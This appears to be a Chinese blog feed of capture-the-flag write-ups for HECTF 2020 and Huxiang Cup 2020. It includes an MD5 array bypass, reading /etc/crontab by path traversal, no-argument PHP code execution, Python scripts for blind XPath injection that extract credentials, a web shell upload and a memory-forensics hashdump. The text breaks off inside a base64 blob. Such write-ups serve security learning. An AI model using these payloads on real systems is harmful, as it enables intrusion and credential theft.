        <content type="html"><![CDATA[<h3 id="by-gyy"><a href="#by-gyy" class="headerlink" title="by:gyy"></a>by:gyy</h3><p>抢了到人生第一次大一点点比赛的一血</p><img src="/article/2020-HECTF-Write-up/1.png" class="" title="img"><hr><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h3><p>题目链接：<a href="http://121.196.32.184:12001/">http://121.196.32.184:12001/</a></p><p>打开发现<code>nonono ，once again！</code></p><p>查看源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token double-quoted-string string">"You need the file is xxx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token double-quoted-string string">"nonono ，once again！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>flag不在<span class="token operator">/</span>flag中哦，你应该找找奇奇怪怪的文件名<span class="token operator">--</span><span class="token operator">></span></code></pre><p><code>$_POST[&#39;a&#39;] !== $_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;])</code><br>老MD5强类型比较，传入两个数组，数组的值不相等，造成MD5加密时报错产生NULL=NULL的情况，绕过比较。<br>即<code>a[]=1&amp;b[]=a</code></p><img src="/article/2020-HECTF-Write-up/image-20201129160030053.png" class="" title="image-20201129160030053"><p>访问./3b8cf4731c36d20776c76e20f9c774c7.php</p><pre class="language-php" data-language="php"><code class="language-php">@<span class="token variable">$data</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token operator">!=</span><span class="token double-quoted-string string">"/xxx"</span><span class="token punctuation">)</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"你需要知道写入的文件名！！！！！我猜你知道到这个文件叫什么,记得加上绝对路径"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token single-quoted-string string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/[^\W]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"great!!!!你需要看看源码"</span><span class="token punctuation">;</span><span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token double-quoted-string string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>你需要知道写入的文件名！！！！！我猜你知道到这个文件叫什么<span class="token punctuation">,</span>记得加上绝对路径</code></pre><p>第一反应猜文件，爆破半天出不来<br>然后去扫目录，发现了/etc等目录，后来比赛方给了hint，<code>/etc/crontab</code></p><p>``./../../../etc/crontab`访问得</p><pre class="language-none"><code class="language-none"># &#x2F;etc&#x2F;crontab: system-wide crontab# Unlike any other crontab you don&#39;t have to run the &#96;crontab&#39;# command to install the new version when you edit this file# and files in &#x2F;etc&#x2F;cron.d. These files also have username fields,# that none of the other crontabs do.SHELL&#x3D;&#x2F;bin&#x2F;shPATH&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;sbin:&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin# Example of job definition:# .---------------- minute (0 - 59)# |  .------------- hour (0 - 23)# |  |  .---------- day of month (1 - 31)# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...# |  |  |  |  .---- day of week (0 - 6) (Sunday&#x3D;0 or 7) OR sun,mon,tue,wed,thu,fri,sat# |  |  |  |  |# *  *  *  *  * user-name command to be executed17 ** * *root    cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.hourly25 6* * *roottest -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.daily )47 6* * 7roottest -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.weekly )52 61 * *roottest -x &#x2F;usr&#x2F;sbin&#x2F;anacron || ( cd &#x2F; &amp;&amp; run-parts --report &#x2F;etc&#x2F;cron.monthly )#0 17 2 8 * &#x2F;bin&#x2F;php &#x2F;very_g00d_Y0u_got_it.php</code></pre><p>很明显<code>/very_g00d_Y0u_got_it.php</code></p><p>访问得啥都没有，因为我们没写东西进去。<br>然后回上一步分析源码，<br><code>&#39;;&#39; === preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $data)</code><br>从data参数中匹配字母、数字、下划线，其实就是’\w+’，然后在匹配一个循环的’()’，将匹配的替换为NULL，判断剩下的是否只有’;’。</p><p>很明显无参数RCE，编写脚本，首先<code>print_r(getcwd());</code></p><img src="/article/2020-HECTF-Write-up/image-20201129160247187.png" class="" title="image-20201129160247187"><p>访问<code>/very_g00d_Y0u_got_it.php</code>得<code>/</code>，说明当前工作目录为根目录</p><img src="/article/2020-HECTF-Write-up/image-20201129160318943.png" class="" title="image-20201129160318943"><p>然后<code>print_r(scandir(getcwd()));</code>扫一下目录</p><pre class="language-none"><code class="language-none">Array(    [0] &#x3D;&gt; .    [1] &#x3D;&gt; ..    [2] &#x3D;&gt; .dockerenv    [3] &#x3D;&gt; 3b8cf4731c36d20776c76e20f9c774c7.php    [4] &#x3D;&gt; Zmw0Z2dnZ2dnZ2dnZ2dnCg    [5] &#x3D;&gt; bin    [6] &#x3D;&gt; boot    [7] &#x3D;&gt; dev    [8] &#x3D;&gt; etc    [9] &#x3D;&gt; flag    [10] &#x3D;&gt; home    [11] &#x3D;&gt; index.php    [12] &#x3D;&gt; lib    [13] &#x3D;&gt; lib64    [14] &#x3D;&gt; media    [15] &#x3D;&gt; mnt    [16] &#x3D;&gt; opt    [17] &#x3D;&gt; proc    [18] &#x3D;&gt; root    [19] &#x3D;&gt; run    [20] &#x3D;&gt; sbin    [21] &#x3D;&gt; srv    [22] &#x3D;&gt; start.sh    [23] &#x3D;&gt; sys    [24] &#x3D;&gt; tmp    [25] &#x3D;&gt; usr    [26] &#x3D;&gt; var    [27] &#x3D;&gt; very_g00d_Y0u_got_it.php)</code></pre><img src="/article/2020-HECTF-Write-up/image-20201129160403000.png" class="" title="image-20201129160403000"><p>发现异常文件<code>Zmw0Z2dnZ2dnZ2dnZ2dnCg</code>，访问后得到了flag</p><img src="/article/2020-HECTF-Write-up/image-20201129160434419.png" class="" title="image-20201129160434419"><p>最后base64一下发现<code>Zmw0Z2dnZ2dnZ2dnZ2dnCg</code>就是<code>fl4gggggggggggg</code></p><p>Payload：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://121.196.32.184:12001"</span>url1 <span class="token operator">=</span> url<span class="token operator">+</span><span class="token string">"/3b8cf4731c36d20776c76e20f9c774c7.php"</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"data"</span> <span class="token punctuation">:</span> <span class="token string">"print_r(scandir(getcwd()));"</span><span class="token punctuation">,</span>    <span class="token string">"file"</span> <span class="token punctuation">:</span> <span class="token string">"/very_g00d_Y0u_got_it.php"</span><span class="token punctuation">&#125;</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url1 <span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>url2 <span class="token operator">=</span> url<span class="token operator">+</span><span class="token string">"/very_g00d_Y0u_got_it.php"</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url2<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span></code></pre><h3 id="injection"><a href="#injection" class="headerlink" title="injection"></a>injection</h3><p>题目链接：<a href="http://114.55.165.246:8082/">http://114.55.165.246:8082/</a></p><p>题目提示为注入，进入界面为登陆框，第一时间想到SQL注入</p><img src="/article/2020-HECTF-Write-up/image-20201129160533941.png" class="" title="image-20201129160533941"><p>输admin登陆一下</p><img src="/article/2020-HECTF-Write-up/image-20201129160554397.png" class="" title="image-20201129160554397"><p>是GET传参，sqlmap跑一下没有结果，万能密码<code>1&#39;or 1=1</code>试一下成功</p><img src="/article/2020-HECTF-Write-up/image-20201129160625642.png" class="" title="image-20201129160625642"><p>怀疑是XXE，尝试了一会发现不是。<br>后来想到XPath注入(傻了，报错里有…)</p><p>XPath基础查询语句<code>//users/user[loginID/text()=’abc’ and password/text()=’test123’]</code></p><p>这是一个XPath查询语句，获取loginID为abc的所有user数据，用户需要提交正确的loginID和password才能返回结果。如果黑客在 loginID 字段中输入：’ or 1=1 并在 password 中输入：’ or 1=1   就能绕过校验，成功获取所有user数据</p><p><code>//users/user[LoginID/text()=&#39;&#39;or 1=1 and password/text()=&#39;&#39;or 1=1]</code></p><p>具体不做阐述</p><hr><p><strong>尝试XPath盲注</strong></p><p>一般步骤如下:</p><p>1.判断根下节点数:</p><p><code>127.0.0.1/xpath/index.php?name=1&#39; or count(/*)=1 or &#39;1&#39;=&#39;1&amp;pwd=fake</code></p><p>result: 1</p><p>2.猜解第一级节点:</p><p><code>127.0.0.1/xpath/index.php?name=1&#39; or substring(name(/*[position()=1]),1,1)=&#39;r&#39; or &#39;1&#39;=&#39;1&amp;pwd=fake</code></p><p><code>127.0.0.1/xpath/index.php?name=1&#39; or substring(name(/*[position()=1]),2,1)=&#39;o&#39; or &#39;1&#39;=&#39;1&amp;pwd=fake</code></p><p>…</p><p>result: root</p><p>3.判断root的下一级节点数:</p><p><code>127.0.0.1/xpath/index.php?name=1&#39; or count(/root/*)=2 or &#39;1&#39;=&#39;1&amp;pwd=fake</code></p><p>result: 2</p><p>4.猜解root的下一级节点:</p><p><code>127.0.0.1/xpath/index.php?name=1&#39; or substring(name(/root/*[position()=1]),1,1)=&#39;u&#39; or &#39;1&#39;=&#39;1&amp;pwd=fake</code></p><p><code>127.0.0.1/xpath/index.php?name=1&#39; or substring(name(/root/*[position()=2]),1,1)=&#39;s&#39; or &#39;1&#39;=&#39;1&amp;pwd=fake</code></p><p>result: users,secret</p><p>重复上述步骤,直到猜解出所有节点.最后来猜解节点中的数据或属性值.</p><p>猜解id为1的user节点下的username值,</p><p><code>127.0.0.1/xpath/index.php?name=1&#39; or substring(/root/users/user[id=1]/username,1,1)=&#39;a&#39; or &#39;1&#39;=&#39;1&amp;pwd=fake</code></p><p>…</p><p>result: admin</p><hr><p>写脚本开始跑<br>首先判断根下节点数<br>因为是GET传参，直接访问<code>http://114.55.165.246:8082/?username=1&#39; or count(/*)=1 or &#39;1&#39;=&#39;1&amp;password=1&amp;submit=登录</code></p><img src="/article/2020-HECTF-Write-up/image-20201129160726706.png" class="" title="image-20201129160726706"><p>这个结果应该是return 1，即根下有一个节点</p><p>如果换成<code>...username=1&#39; or count(/*)=2 or &#39;1&#39;=&#39;1...</code>则会返回登录失败，即结果为return 0.</p><p>继续猜测第一级节点，用脚本跑</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> rebaseurl <span class="token operator">=</span> <span class="token string">"http://114.55.165.246:8082/?username="</span>s <span class="token operator">=</span> <span class="token string">"qwertyuiopasdfghjklzxcvbnm1234567890"</span>result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">"1' or substring(name(/!XXXX!*[position()=1]),"</span>        payload <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>        payload <span class="token operator">+=</span> <span class="token string">",1)='"</span>        payload <span class="token operator">+=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        payload <span class="token operator">+=</span> <span class="token string">"' or '1'='1"</span>        end <span class="token operator">=</span> <span class="token string">"&amp;password=admin&amp;submit=登录"</span>        url <span class="token operator">=</span> baseurl <span class="token operator">+</span> payload <span class="token operator">+</span> end        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"&lt;/html>"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"you"</span><span class="token punctuation">,</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>            flag<span class="token operator">=</span><span class="token number">1</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">"--------->"</span> <span class="token operator">+</span> res<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"\r\n"</span> <span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>    <span class="token keyword">if</span> flag <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">break</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token comment"># !####! 换成目录即可</span></code></pre><p>结果爆出第一级为root</p><img src="/article/2020-HECTF-Write-up/image-20201129161139719.png" class="" title="image-20201129161139719"><p>同理，修改第13行为<code>&quot;1&#39; or substring(name(/root/*[position()=1]),&quot;</code><br>继续爆</p><img src="/article/2020-HECTF-Write-up/image-20201129161225253.png" class="" title="image-20201129161225253"><img src="/article/2020-HECTF-Write-up/image-20201129161255235.png" class="" title="image-20201129161255235"><img src="/article/2020-HECTF-Write-up/image-20201129161318627.png" class="" title="image-20201129161318627"><p>最后爆出结构为/root/users/user[id]</p><p>开始猜测id为1的user节点下username值，其实能猜到的admin</p><p>payload：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> rebaseurl <span class="token operator">=</span> <span class="token string">"http://114.55.165.246:8082/?username="</span>s <span class="token operator">=</span> <span class="token string">"qwertyuiopasdfghjklzxcvbnm1234567890"</span>result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag<span class="token operator">=</span><span class="token number">0</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">"1' or substring(/root/users/user[id=1]/username,"</span>        payload <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span>        payload <span class="token operator">+=</span> <span class="token string">",1)='"</span>        payload <span class="token operator">+=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        payload <span class="token operator">+=</span> <span class="token string">"' or '1'='1"</span>        end <span class="token operator">=</span> <span class="token string">"&amp;password=admin&amp;submit=登录"</span>        url <span class="token operator">=</span> baseurl <span class="token operator">+</span> payload <span class="token operator">+</span> end        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"&lt;/html>"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"you"</span><span class="token punctuation">,</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>            flag <span class="token operator">=</span> <span class="token number">1</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"第"</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"位----------->"</span><span class="token operator">+</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>    <span class="token keyword">if</span> flag<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">break</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token comment"># 爆密码就把username改成password</span></code></pre><p>爆username</p><img src="/article/2020-HECTF-Write-up/image-20201129162416104.png" class="" title="image-20201129162416104"><p>果然是admin</p><p>继续爆password</p><img src="/article/2020-HECTF-Write-up/image-20201129161907953.png" class="" title="image-20201129161907953"><p>结果password=339db714647a1d66b85cd08442287841</p><p>登录一下，获得flag</p><img src="/article/2020-HECTF-Write-up/image-20201129161946397.png" class="" title="image-20201129161946397">]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> md5 </tag>
            
            <tag> 无参数RCE </tag>
            
            <tag> XPath注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020hxb-Writeup</title>
      <link href="article/2020hxb-Writeup-cOMING/"/>
      <url>article/2020hxb-Writeup-cOMING/</url>
      
        <content type="html"><![CDATA[<h1 id="湖湘杯2020"><a href="#湖湘杯2020" class="headerlink" title="湖湘杯2020"></a>湖湘杯2020</h1><p>队伍情况</p><p>队伍名称：cOMING</p><img src="/article/2020hxb-Writeup-cOMING/b98885edfaae8f28a1142482b1c5a273.png" class=""><p>队伍成员</p><p>gyy,Trick,hxq</p><a id="more"></a><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="题目名字不重要反正题挺简单的"><a href="#题目名字不重要反正题挺简单的" class="headerlink" title="题目名字不重要反正题挺简单的"></a>题目名字不重要反正题挺简单的</h3><p>直接白给phpinfo <a href="http://47.111.104.169:57301/?file=phpinfo">http://47.111.104.169:57301/?file=phpinfo</a></p><img src="/article/2020hxb-Writeup-cOMING/3374b2c0d3129c0282de5d456026c0f9.png" class=""><h3 id="NewWebsite"><a href="#NewWebsite" class="headerlink" title="NewWebsite"></a>NewWebsite</h3><p>进网站找后台./admin/<br>输入用户名密码均为admin登陆成功,html发现有/?r=manageinfo，进入改头像，上传一句话木马，蚁剑连上可得flag</p><img src="/article/2020hxb-Writeup-cOMING/031b1eb11298e4c672f6e91a3b07b170.png" class=""><p>91d7fbeecf940113dfca79a0194d8292</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="passwd"><a href="#passwd" class="headerlink" title="passwd"></a>passwd</h3><p><code>volatility -f WIN-BU6IJ7FI9RU-20190927-152050.raw  imageinfo</code></p><img src="/article/2020hxb-Writeup-cOMING/7b3aaf83f2a475ad5cab06c8856973c4.png" class=""><p>内存取证 win7： <code>volatility -f WIN-BU6IJ7FI9RU-20190927-152050.raw --profile=Win7SP1x86_23418 hashdump</code></p><img src="/article/2020hxb-Writeup-cOMING/4d11382c75521a279254c1d8f939e7e2.png" class=""><p>MD5解出</p><p>CTF：</p><p>aad3…：空密码</p><p>0a64…:qwer1234</p><p>再结合题目：we need sha1(password)!!! sha1</p><p>解密qwer1234</p><img src="/article/2020hxb-Writeup-cOMING/ee50c0fb45bc04ff9f82fad1289d5ec8.png" class=""><p>出flag</p><h3 id="虚实之间"><a href="#虚实之间" class="headerlink" title="虚实之间"></a>虚实之间</h3><p>开文件发现<code>mingwen - 副本.txt</code>是伪加密,拖出来打包后明文攻击</p><p>爆破得密码：123%asd!O</p><img src="/article/2020hxb-Writeup-cOMING/1a7883d1491cfe53eb8d922f1251ee04.png" class=""><pre class="language-none"><code class="language-none">仅需5，跳过去ffd5e341le25b2dcab15cbb&#125;gc3bc5b&#123;789b51</code></pre><p>联想栅栏加密 直接出flag</p><img src="/article/2020hxb-Writeup-cOMING/b510b2e1aae50a2ba791f6bac42dcdc2.png" class=""><h3 id="颜文字"><a href="#颜文字" class="headerlink" title="颜文字"></a>颜文字</h3><p>东西很多，最终发现这有个.html是有用的</p><img src="/article/2020hxb-Writeup-cOMING/9302d47555b72dfa1fd14d8a8b8394e2.png" class=""><p>打开，F12</p><img src="/article/2020hxb-Writeup-cOMING/f2ffd31423755c064eb38a0e7dc062f5.png" class=""><p>发现base64</p><pre class="language-none"><code class="language-none">KO+9oe+9peKIgO+9pSnvvonvvp7ll6hIaX4gCm&#x3D;&#x3D;KO+8oF&#x2F;vvKA7KSjvvKBf77ygOyko77ygX++8oDspCr&#x3D;&#x3D;                            KCtfKyk&#x2F;KOOAgj7vuL88KV&#x2F;OuCjjgII+77i&#x2F;PClfzrgK                                  bygq77+j4pa977+jKinjg5bjgpwK                                      77yc77yI77y+77yN77y+77yJ77yeKOKVr+KWveKVsCAp5aW96aaZfn4K                  44O9KOKcv+++n+KWve++nynjg44o77yg77y+77yQ77y+KQp&#x3D;                    KF5e44Kezqgo77+j4oiA77+jKc6oKuKYhSzCsCo6LuKYhijvv6Pilr3vv6MpLyQ6Ki7CsOKYhSog44CCCp&#x3D;&#x3D;flwo4omn4pa94ommKS9+byhe4pa9XilvKMKs4oC&#x2F;wqwpKCriiafvuLbiiaYpKSjvv6Pilr3vv6MqICnjgp7ilLPilIHilLMo4pWv4oC14pah4oCyKeKVr++4teKUu+KUgeKUuwp&#x3D;4pSz4pSB4pSzIOODjigg44KcLeOCnOODjingsqBf4LKgCn&#x3D;&#x3D;                     4LKgX+CyoCjila&#x2F;igLXilqHigLIp4pWv54K45by577yB4oCi4oCi4oCiKu+9nuKXjyjCrF&#x2F;CrCApCp&#x3D;&#x3D;KOODjuOBuO+&#x2F;o+OAgSlvKO+&#x2F;o+KUsO+&#x2F;oyop44Ke4pWwKOiJueeav+iJuSAp77yI77i2Xu+4tu+8iSgqIO+&#x2F;o++4v++&#x2F;oyko77+jzrUoI++&#x2F;oykKKO++n9CU776fKinvvonil4t877+jfF8gPTMo44OO772A0JQp44OOKOKAstC0772Az4Mpz4Mo77+i77i&#x2F;zKvMv++&#x2F;ouKYhinvvZ4o44CAVOODrVQpz4M8KCDigLXilqHigLIpPuKUgOKUgAo&#x3D;KMKsX8KsIiko77+j77mP77+j77ybKSjila&#x2F;CsOKWocKw77yJ4pWv77i1IOKUu+KUgeKUu+ODvSjjgpzilr3jgpzjgIAp77yNQzwoLzvil4c7KS9+KOODmO+9pV&#x2F;vvaUp44OY4pSz4pSB4pSzCu&#x3D;&#x3D;4LKgX+CyoCjila&#x2F;igLXilqHigLIp4pWv54K45by577yB4oCi4oCi4oCiKu+9nuKXjyjCrF&#x2F;CrCApCo&#x3D;&#x3D;KOKKmcuN4oqZKe+8nyjPg++9gNC04oCyKc+DPCgg4oC14pah4oCyKT7ilIDilIDilIDvvKPOtSjilKzvuY&#x2F;ilKwpMzwoIOKAteKWoeKAsinilIDilIDilIBD77yc4pSAX19fLSl8fO+9nijjgIBU44OtVCnPgyjjgIMK4oqZ77mP4oqZ4oil44O9KCrjgII+0JQ8KW&#x2F;jgpwvKOOEkm&#x2F;jhJIpL35+KCNfPC0p77yI77ye5Lq677yc77yb77yJCo&#x3D;&#x3D;KOODjuOBuO+&#x2F;o+OAgSlvKO+&#x2F;o+KUsO+&#x2F;oyop44Ke4pWwKOiJueeav+iJuSAp77yI77i2Xu+4tu+8iSgqIO+&#x2F;o++4v++&#x2F;oyko77+jzrUoI++&#x2F;oykKKO++n9CU776fKinvvonil4t877+jfF8gPTMo44OO772A0JQp44OOKOKAstC0772Az4Mpz4Mo77+i77i&#x2F;zKvMv++&#x2F;ouKYhinvvZ4o44CAVOODrVQpz4M8KCDigLXilqHigLIpPuKUgOKUgAq&#x3D;KOKKmcuN4oqZKe+8nyjPg++9gNC04oCyKc+DPCgg4oC14pah4oCyKT7ilIDilIDilIDvvKPOtSjilKzvuY&#x2F;ilKwpMzwoIOKAteKWoeKAsinilIDilIDilIBD77yc4pSAX19fLSl8fO+9nijjgIBU44OtVCnPgyjjgIPvvJ7nm67vvJwpCm&#x3D;&#x3D;KG&#x2F;vvp92776fKeODjmQ9PT09PSjvv6Pilr3vv6MqKWLOtT3OtT3OtT0ofu+&#x2F;o+KWve+&#x2F;oyl+KOKdpCDPiSDinaQpVeKAouOCp+KAoipVCs&#x3D;&#x3D;KO++n9CU776fKinvvonil4t877+jfF8gPTMo44OO772A0JQp44OOKOKAstC0772Az4Mpz4Mo77+i77i&#x2F;zKvMv++&#x2F;ouKYhinvvZ4o44CAVOODrVQpz4M8KCDigLXilqHigLIpPuKUgOKUgAp&#x3D;KOKKmcuN4oqZKe+8nyjPg++9gNC04oCyKc+DPCgg4oC14pah4oCyKT7ilIDilIDilIDvvKPOtSjilKzvuY&#x2F;ilKwpMzwoIOKAteKWoeKAsinilIDilIDilIBD77yc4pSAX19fLSl8fO+9nijjgIBU44OtVCnPgyjjgIPvvJ7nm67vvJwpCr&#x3D;&#x3D;KG&#x2F;vvp92776fKeODjmQ9PT09PSjvv6Pilr3vv6MqKWLOtT3OtT3OtT0ofu+&#x2F;o+KWve+&#x2F;oyl+KOKdpCDPiSDinaQpVeKAouOCp+KAoipVCt&#x3D;&#x3D;KO++n9CU776fKinvvonil4t877+jfF8gPTMo44OO772A0JQp44OOKOKAstC0772Az4Mpz4Mo77+i77i&#x2F;zKvMv++&#x2F;ouKYhinvvZ4o44CAVOODrVQpz4M8KCDigLXilqHigLIpPuKUgOKUgAr&#x3D;KOKKmcuN4oqZKe+8nyjPg++9gNC04oCyKc+DPCgg4oC14pah4oCyKT7ilIDilIDilIDvvKPOtSjilKzvuY&#x2F;ilKwpMzwoIOKAteKWoeKAsinilIDilIDilIBD77yc4pSAX19fLSl8fO+9nijjgIBU44OtVCnPgyjjgIPvvJ7nm67vvJwpCi&#x3D;&#x3D;KG&#x2F;vvp92776fKeODjmQ9PT09PSjvv6Pilr3vv6MqKWLOtT3OtT3OtT0ofu+&#x2F;o+KWve+&#x2F;oyl+KOKdpCDPiSDinaQpVeKAouOCp+KAoipVCn&#x3D;&#x3D;KO++n9CU776fKinvvonil4t877+jfF8gPTMo44OO772A0JQp44OOKOKAstC0772Az4Mpz4Mo77+i77i&#x2F;zKvMv++&#x2F;ouKYhinvvZ4o44CAVOODrVQpz4M8KCDigLXilqHigLIpPuKUgOKUgAo&#x3D;KOKKmcuN4oqZKe+8nyjPg++9gNC04oCyKc+DPCgg4oC14pah4oCyKT7ilIDilIDilIDvvKPOtSjilKzvuY&#x2F;ilKwpMzwoIOKAteKWoeKAsinilIDilIDilIBD77yc4pSAX19fLSl8fO+9nijjgIBU44OtVCnPgyjjgIPvvJ7n